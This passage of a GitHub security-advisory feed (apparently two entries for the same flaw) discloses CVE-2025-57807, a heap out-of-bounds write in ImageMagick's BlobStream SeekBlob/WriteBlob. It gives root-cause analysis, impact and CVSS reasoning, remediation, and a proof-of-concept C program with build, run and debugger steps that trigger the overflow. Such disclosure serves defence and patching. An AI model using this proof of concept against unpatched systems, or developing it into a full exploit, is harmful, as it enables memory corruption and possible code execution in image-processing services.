<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-HDRI-x64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
